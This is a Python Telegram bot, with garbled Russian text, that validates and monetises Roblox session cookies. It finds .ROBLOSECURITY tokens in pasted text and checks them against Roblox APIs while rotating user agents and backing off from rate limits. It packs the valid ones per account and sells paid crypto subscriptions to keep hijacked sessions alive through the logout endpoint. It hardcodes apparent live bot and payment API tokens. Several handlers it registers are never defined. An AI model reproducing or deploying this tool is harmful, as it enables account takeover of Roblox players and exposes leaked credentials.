import os
import logging
import re
import random
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import json
from datetime import datetime, timedelta

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = "8204086100:AAFmfYGPLqtBpSpJk1FgyCwU87l6K2ZieTo"
CRYPTO_BOT_TOKEN = "470734:AAKKe0DuwX6a5WvXEUnsGGBrRSbyN3YJvxH"
CRYPTO_BOT_API_URL = "https://pay.crypt.bot/api/"

logging.basicConfig(level=logging.INFO)

class CryptoPayment:
    def __init__(self):
        self.api_url = CRYPTO_BOT_API_URL
        self.token = CRYPTO_BOT_TOKEN
        self.headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
    
    async def create_invoice(self, amount: float, description: str, user_id: int):
        """–°–æ–∑–¥–∞–Ω–∏–µ –∏–Ω–≤–æ–π—Å–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã"""
        try:
            payload = {
                'asset': 'USDT',
                'amount': str(amount),
                'description': description,
                'hidden_message': f'–û–ø–ª–∞—Ç–∞ –ø–æ–¥–ø–∏—Å–∫–∏ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}',
                'paid_btn_name': 'callback',
                'paid_btn_url': 'https://t.me/your_bot',
                'payload': str(user_id),
                'allow_comments': False,
                'allow_anonymous': False,
                'expires_in': 3600  # 1 —á–∞—Å
            }
            
            response = requests.post(
                f"{self.api_url}createInvoice",
                headers=self.headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return True, data['result']
                else:
                    return False, f"–û—à–∏–±–∫–∞ API: {data.get('error', 'Unknown error')}"
            else:
                return False, f"HTTP –æ—à–∏–±–∫–∞: {response.status_code}"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∏–Ω–≤–æ–π—Å–∞: {str(e)}"
    
    async def check_invoice_status(self, invoice_id: int):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –∏–Ω–≤–æ–π—Å–∞"""
        try:
            response = requests.get(
                f"{self.api_url}getInvoices?invoice_ids={invoice_id}",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data['result']['items']:
                    invoice = data['result']['items'][0]
                    return True, invoice
                else:
                    return False, "–ò–Ω–≤–æ–π—Å –Ω–µ –Ω–∞–π–¥–µ–Ω"
            else:
                return False, f"HTTP –æ—à–∏–±–∫–∞: {response.status_code}"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞: {str(e)}"
    
    async def validate_payment(self, user_id: int, amount: float):
        """–°—Ç—Ä–æ–≥–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –æ–ø–ª–∞—Ç—ã"""
        try:
            # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –∏–Ω–≤–æ–π—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            response = requests.get(
                f"{self.api_url}getInvoices",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    for invoice in data['result']['items']:
                        if (invoice.get('payload') == str(user_id) and 
                            invoice.get('status') == 'paid' and
                            float(invoice.get('amount', 0)) >= amount):
                            # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–∏
                            paid_at = datetime.fromtimestamp(invoice.get('paid_at', 0))
                            if datetime.now() - paid_at < timedelta(hours=24):
                                return True, invoice
                    return False, "–û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º"
                else:
                    return False, "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –∏–Ω–≤–æ–π—Å–æ–≤"
            else:
                return False, f"HTTP –æ—à–∏–±–∫–∞: {response.status_code}"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ–ø–ª–∞—Ç—ã: {str(e)}"

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
        self.user_cookies = {}
        self.subscriptions = {}
        self.crypto_payment = CryptoPayment()
        self.premium_prices = {
            '1_week': 5.0,    # 5 USDT –∑–∞ –Ω–µ–¥–µ–ª—é
            '1_month': 15.0,  # 15 USDT –∑–∞ –º–µ—Å—è—Ü
            '3_months': 40.0  # 40 USDT –∑–∞ 3 –º–µ—Å—è—Ü–∞
        }
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"‚ö†Ô∏è Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                return response
            except requests.exceptions.RequestException as e:
                print(f"‚ö†Ô∏è Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
        return None

    def extract_cookies_from_text(self, text):
        cookies = []
        warning_pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]+(?:\|[^\s]*)*'
        warning_matches = re.findall(warning_pattern, text)
        
        for match in warning_matches:
            cookie_candidate = match.strip()
            if len(cookie_candidate) > 50:
                cookies.append(cookie_candidate)
                print(f"üîç –ù–∞–π–¥–µ–Ω–∞ –∫—É–∫–∏: {cookie_candidate[:80]}...")
        
        if not cookies:
            clean_text = text.strip()
            if (len(clean_text) > 300 and 
                '_|WARNING:-DO-NOT-SHARE-THIS' in clean_text and
                'Sharing-this-will-allow-someone-to-log-in-as-you' in clean_text):
                cookies.append(clean_text)
                print(f"üîç –ù–∞–π–¥–µ–Ω–∞ —á–∏—Å—Ç–∞—è –∫—É–∫–∏: {clean_text[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        return cookie_data.strip()

    def refresh_cookie_with_auth_key(self, cookie_data, auth_key):
        try:
            if not cookie_data.startswith('.ROBLOSECURITY='):
                cookie_string = f'.ROBLOSECURITY={cookie_data}'
            else:
                cookie_string = cookie_data
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_string,
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': auth_key
            }
            
            refresh_url = 'https://auth.roblox.com/v2/logout'
            response = requests.post(refresh_url, headers=headers, timeout=10)
            
            if response.status_code == 200 or response.status_code == 403:
                if 'set-cookie' in response.headers:
                    new_cookies = response.headers['set-cookie']
                    roblosecurity_match = re.search(r'\.ROBLOSECURITY=([^;]+)', new_cookies)
                    if roblosecurity_match:
                        new_cookie = roblosecurity_match.group(1)
                        return True, new_cookie, "‚úÖ –ö—É–∫–∏ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∞"
            
            return False, cookie_data, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å –∫—É–∫–∏"
            
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∫—É–∫–∏: {e}")
            return False, cookie_data, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}"

    def simple_cookie_validation(self, cookie_data):
        self.checked_count += 1
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        time.sleep(random.uniform(1, 3))
        
        try:
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.make_robust_request(api_url, headers)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"‚úÖ VALID - User: {username} (ID: {user_id})", username, user_id
                
            mobile_headers = headers.copy()
            mobile_headers['User-Agent'] = 'Roblox/iOS'
            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
            mobile_response = self.make_robust_request(mobile_url, mobile_headers)
            
            if mobile_response and mobile_response.status_code == 200:
                mobile_data = mobile_response.json()
                if 'UserID' in mobile_data and mobile_data['UserID'] > 0:
                    username = mobile_data.get('UserName', 'Unknown')
                    user_id = mobile_data['UserID']
                    self.valid_count += 1
                    return True, cookie_clean, f"‚úÖ VALID - User: {username} (ID: {user_id})", username, user_id
            
            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
            
            if home_response and home_response.status_code == 200:
                current_url = home_response.url.lower()
                if 'login' not in current_url and 'signup' not in current_url:
                    self.valid_count += 1
                    return True, cookie_clean, "‚úÖ VALID - Home page access", "Unknown", "Unknown"
        
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏: {e}")
            return False, cookie_clean, f"‚ùå ERROR - {str(e)}", "Unknown", "Unknown"
        
        return False, cookie_clean, "‚ùå INVALID - All checks failed", "Unknown", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"üîç –ù–∞–π–¥–µ–Ω–æ –∫—É–∫–∏ –≤ —Ç–µ–∫—Å—Ç–µ: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "‚ùå –í —Ç–µ–∫—Å—Ç–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –Ω–∏ –æ–¥–Ω–æ–π –∫—É–∫–∏"
        
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': [],
            'user_ids': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"üîç –ü—Ä–æ–≤–µ—Ä—è—é –∫—É–∫–∏ {i}/{total}")
            is_valid, clean_cookie, status, username, user_id_val = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                self.user_cookies[user_id]['user_ids'].append(user_id_val)
                results.append(f"‚úÖ {i}/{total}: {status}")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"‚ùå {i}/{total}: {status}")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                zipf.write(filename, filename)
                os.remove(filename)
        
        return zip_filename

    def subscribe_user(self, user_id, cookie_index, auth_key, plan_type):
        if user_id not in self.user_cookies:
            return False, "‚ùå –ö—É–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã"
        
        if cookie_index >= len(self.user_cookies[user_id]['valid_cookies']):
            return False, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∏–Ω–¥–µ–∫—Å –∫—É–∫–∏"
        
        cookie = self.user_cookies[user_id]['valid_cookies'][cookie_index]
        username = self.user_cookies[user_id]['usernames'][cookie_index]
        user_id_val = self.user_cookies[user_id]['user_ids'][cookie_index]
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å—Ä–æ–∫ –ø–æ–¥–ø–∏—Å–∫–∏
        if plan_type == '1_week':
            expiry_date = datetime.now() + timedelta(days=7)
        elif plan_type == '1_month':
            expiry_date = datetime.now() + timedelta(days=30)
        elif plan_type == '3_months':
            expiry_date = datetime.now() + timedelta(days=90)
        else:
            return False, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø –ø–æ–¥–ø–∏—Å–∫–∏"
        
        self.subscriptions[user_id] = {
            'cookie': cookie,
            'username': username,
            'user_id': user_id_val,
            'auth_key': auth_key,
            'plan_type': plan_type,
            'subscribe_date': datetime.now(),
            'expiry_date': expiry_date,
            'last_refresh': datetime.now(),
            'is_premium': True
        }
        
        return True, f"‚úÖ –ü—Ä–µ–º–∏—É–º –ø–æ–¥–ø–∏—Å–∫–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ –¥–ª—è {username} –¥–æ {expiry_date.strftime('%d.%m.%Y')}"

    def refresh_subscribed_cookie(self, user_id):
        if user_id not in self.subscriptions:
            return False, "‚ùå –ü–æ–¥–ø–∏—Å–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞"
        
        subscription = self.subscriptions[user_id]
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ –∏—Å—Ç–µ–∫–ª–∞ –ª–∏ –ø–æ–¥–ø–∏—Å–∫–∞
        if datetime.now() > subscription['expiry_date']:
            del self.subscriptions[user_id]
            return False, "‚ùå –°—Ä–æ–∫ –ø–æ–¥–ø–∏—Å–∫–∏ –∏—Å—Ç–µ–∫"
        
        cookie = subscription['cookie']
        auth_key = subscription['auth_key']
        
        success, new_cookie, message = self.refresh_cookie_with_auth_key(cookie, auth_key)
        
        if success:
            self.subscriptions[user_id]['cookie'] = new_cookie
            self.subscriptions[user_id]['last_refresh'] = datetime.now()
            
            is_valid, _, status, username, _ = self.simple_cookie_validation(new_cookie)
            if is_valid:
                return True, f"‚úÖ –ö—É–∫–∏ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∞ –∏ –≤–∞–ª–∏–¥–Ω–∞\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}"
            else:
                return False, "‚ùå –ö—É–∫–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∞, –Ω–æ –Ω–µ –ø—Ä–æ—à–ª–∞ –≤–∞–ª–∏–¥–∞—Ü–∏—é"
        else:
            return False, message

    def get_command_keyboard(self):
        """–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å –∫–æ–º–∞–Ω–¥–∞–º–∏ –¥–ª—è –Ω–∏–∂–Ω–µ–π —á–∞—Å—Ç–∏ —Å–æ–æ–±—â–µ–Ω–∏–π"""
        keyboard = [
            [InlineKeyboardButton("üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫—É–∫–∏", callback_data="check_cookies"),
             InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="show_stats")],
            [InlineKeyboardButton("üíé –ü—Ä–µ–º–∏—É–º", callback_data="premium_info"),
             InlineKeyboardButton("üîÑ –ú–æ—è –ø–æ–¥–ø–∏—Å–∫–∞", callback_data="my_subscription")],
            [InlineKeyboardButton("‚ÑπÔ∏è –ü–æ–º–æ—â—å", callback_data="help_command")]
        ]
        return InlineKeyboardMarkup(keyboard)

checker = RobloxCookieChecker()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
üîç –ë–æ—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ Roblox –∫—É–∫–∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω

–û—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏:
‚Ä¢ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –∫—É–∫–∏
‚Ä¢ –†–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–æ —Ñ–∞–π–ª–∞–º  
‚Ä¢ –ü—Ä–µ–º–∏—É–º –ø–æ–¥–ø–∏—Å–∫–∞ —Å –∞–≤—Ç–æ-–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ–º
‚Ä¢ –°—Ç—Ä–æ–≥–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –æ–ø–ª–∞—Ç—ã

–ü—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫—É–∫–∏ —Ç–µ–∫—Å—Ç–æ–º –∏–ª–∏ —Ñ–∞–π–ª–æ–º –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏.
    """
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=checker.get_command_keyboard()
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = f"""
üìä –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ü–†–û–í–ï–†–û–ö:

‚Ä¢ –í—Å–µ–≥–æ –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ: {checker.checked_count}
‚Ä¢ –í–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏: {checker.valid_count}
‚Ä¢ –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {checker.checked_count - checker.valid_count}
‚Ä¢ –ü—Ä–æ—Ü–µ–Ω—Ç –≤–∞–ª–∏–¥–Ω—ã—Ö: {checker.valid_count/max(1, checker.checked_count)*100:.1f}%
‚Ä¢ –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–ø–∏—Å–æ–∫: {len(checker.subscriptions)}
    """
    await update.message.reply_text(
        stats_text,
        reply_markup=checker.get_command_keyboard()
    )

async def premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    premium_text = f"""
üíé –ü–†–ï–ú–ò–£–ú –ü–û–î–ü–ò–°–ö–ê

–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:
‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫—É–∫–∏
‚Ä¢ –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
‚Ä¢ –ù–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤
‚Ä¢ –ü–æ–¥–¥–µ—Ä–∂–∫–∞ 24/7

–¢–∞—Ä–∏—Ñ—ã:
‚Ä¢ 1 –Ω–µ–¥–µ–ª—è - {checker.premium_prices['1_week']} USDT
‚Ä¢ 1 –º–µ—Å—è—Ü - {checker.premium_prices['1_month']} USDT  
‚Ä¢ 3 –º–µ—Å—è—Ü–∞ - {checker.premium_prices['3_months']} USDT

–î–ª—è –æ–ø–ª–∞—Ç—ã –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ /buy_premium
    """
    
    keyboard = [
        [InlineKeyboardButton("üí∞ –ö—É–ø–∏—Ç—å –ø—Ä–µ–º–∏—É–º", callback_data="buy_premium")],
        [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(premium_text, reply_markup=reply_markup)

async def buy_premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    keyboard = [
        [InlineKeyboardButton("1 –Ω–µ–¥–µ–ª—è", callback_data="buy_1_week")],
        [InlineKeyboardButton("1 –º–µ—Å—è—Ü", callback_data="buy_1_month")],
        [InlineKeyboardButton("3 –º–µ—Å—è—Ü–∞", callback_data="buy_3_months")],
        [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="premium_info")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "üí∞ –í–´–ë–ï–†–ò–¢–ï –¢–ê–†–ò–§ –ü–†–ï–ú–ò–£–ú:",
        reply_markup=reply_markup
    )

async def handle_payment_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan_type = query.data.replace('buy_', '')
    
    if plan_type not in checker.premium_prices:
        await query.edit_message_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø –ø–æ–¥–ø–∏—Å–∫–∏")
        return
    
    amount = checker.premium_prices[plan_type]
    
    # –°–æ–∑–¥–∞–µ–º –∏–Ω–≤–æ–π—Å
    success, result = await checker.crypto_payment.create_invoice(
        amount=amount,
        description=f"–ü—Ä–µ–º–∏—É–º –ø–æ–¥–ø–∏—Å–∫–∞ {plan_type.replace('_', ' ')}",
        user_id=user_id
    )
    
    if success:
        invoice_url = result['pay_url']
        invoice_id = result['invoice_id']
        
        payment_text = f"""
üí∞ –û–ü–õ–ê–¢–ê –ü–†–ï–ú–ò–£–ú –ü–û–î–ü–ò–°–ö–ò

–¢–∞—Ä–∏—Ñ: {plan_type.replace('_', ' ')}
–°—É–º–º–∞: {amount} USDT
–°–µ—Ç—å: TRC-20

–î–ª—è –æ–ø–ª–∞—Ç—ã –ø–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ:
{invoice_url}

–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É"
        """
        
        keyboard = [
            [InlineKeyboardButton("üîó –ü–µ—Ä–µ–π—Ç–∏ –∫ –æ–ø–ª–∞—Ç–µ", url=invoice_url)],
            [InlineKeyboardButton("‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É", callback_data=f"check_payment_{invoice_id}_{plan_type}")],
            [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="premium_info")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(payment_text, reply_markup=reply_markup)
    else:
        await query.edit_message_text(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∏–Ω–≤–æ–π—Å–∞: {result}")

async def check_payment_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data_parts = query.data.split('_')
    invoice_id = int(data_parts[2])
    plan_type = data_parts[3]
    
    await query.edit_message_text("üîç –ü—Ä–æ–≤–µ—Ä—è—é —Å—Ç–∞—Ç—É—Å –æ–ø–ª–∞—Ç—ã...")
    
    # –°—Ç—Ä–æ–≥–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –æ–ø–ª–∞—Ç—ã
    amount = checker.premium_prices[plan_type]
    success, result = await checker.crypto_payment.validate_payment(user_id, amount)
    
    if success:
        # –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º –ø—Ä–µ–º–∏—É–º –ø–æ–¥–ø–∏—Å–∫—É
        if user_id in checker.user_cookies and checker.user_cookies[user_id]['valid_cookies']:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–≤—É—é –≤–∞–ª–∏–¥–Ω—É—é –∫—É–∫–∏ –¥–ª—è –ø–æ–¥–ø–∏—Å–∫–∏
            success_sub, message = checker.subscribe_user(
                user_id=user_id,
                cookie_index=0,
                auth_key="premium_activated",  # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–±–∞–≤–∏—Ç auth key –ø–æ–∑–∂–µ
                plan_type=plan_type
            )
            
            if success_sub:
                await query.edit_message_text(
                    f"‚úÖ –û–ü–õ–ê–¢–ê –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ê!\n\n{message}\n\n"
                    f"–¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ auth key –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –∞–≤—Ç–æ-–æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∫—É–∫–∏."
                )
            else:
                await query.edit_message_text(f"‚úÖ –û–ü–õ–ê–¢–ê –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ê!\n\n{message}")
        else:
            await query.edit_message_text(
                "‚úÖ –û–ü–õ–ê–¢–ê –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ê!\n\n"
                "–ü—Ä–µ–º–∏—É–º —Å—Ç–∞—Ç—É—Å –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω. –¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫—É–∫–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ "
                "–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –∞–≤—Ç–æ-–æ–±–Ω–æ–≤–ª–µ–Ω–∏—è."
            )
    else:
        await query.edit_message_text(
            f"‚ùå –û–ü–õ–ê–¢–ê –ù–ï –ù–ê–ô–î–ï–ù–ê\n\n"
            f"–ü—Ä–∏—á–∏–Ω–∞: {result}\n\n"
            f"–ï—Å–ª–∏ –≤—ã –ø—Ä–æ–∏–∑–≤–µ–ª–∏ –æ–ø–ª–∞—Ç—É, –ø–æ–¥–æ–∂–¥–∏—Ç–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç –∏ –ø—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–Ω–æ–≤–∞."
        )

# ... –æ—Å—Ç–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ (handle_message, button_handler, etc.) –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
# –Ω–æ –¥–æ–±–∞–≤–ª—è–µ–º reply_markup=checker.get_command_keyboard() –≤ –∫–æ–Ω–µ—Ü –∫–∞–∂–¥–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("premium", premium_command))
    app.add_handler(CommandHandler("buy_premium", buy_premium_command))
    app.add_handler(CommandHandler("mysub", mysub_command))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_auth_key))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –æ–ø–ª–∞—Ç—ã
    app.add_handler(CallbackQueryHandler(handle_payment_selection, pattern="^buy_"))
    app.add_handler(CallbackQueryHandler(check_payment_status, pattern="^check_payment_"))
    
    print("ü§ñ –ë–æ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ Roblox –∫—É–∫–∏ —Å –æ–ø–ª–∞—Ç–æ–π –∑–∞–ø—É—â–µ–Ω...")
    print("‚úÖ –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")
    app.run_polling()

if __name__ == "__main__":
    main()
